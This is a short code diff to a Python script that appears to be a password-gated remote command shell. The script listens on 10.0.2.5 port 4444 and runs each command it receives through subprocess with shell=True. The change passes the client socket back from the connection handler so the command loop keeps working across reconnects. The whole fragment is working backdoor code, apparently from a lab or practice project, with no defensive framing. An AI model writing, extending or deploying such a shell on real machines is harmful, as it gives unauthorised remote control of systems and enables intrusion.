@@ -14,7 +14,7 @@ def lookForConnection(server, passwords_match):
         client.send(("Incorrect Password...Closing Connection").encode())
         client.close()
     print(str(client_addr) + " has connected to the server")
-    return passwords_match
+    return passwords_match, client
 
 HOST = '10.0.2.5'
 PORT = 4444 
@@ -24,7 +24,7 @@ server = socket.socket()
 server.bind((HOST, PORT))
 print('Server Started')
 print('Listening For Client Connection')
-passwords_match = lookForConnection(server, passwords_match)
+passwords_match, client = lookForConnection(server, passwords_match)
 
 while passwords_match == True:
     print("[-] Awaiting commands...")
@@ -33,7 +33,7 @@ while passwords_match == True:
     if command == "exit":
         passwords_match == False
         client.close()
-        passwords_match = lookForConnection(server, passwords_match)
+        passwords_match, client = lookForConnection(server, passwords_match)
     else:
         op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
         output = op.stdout.read()
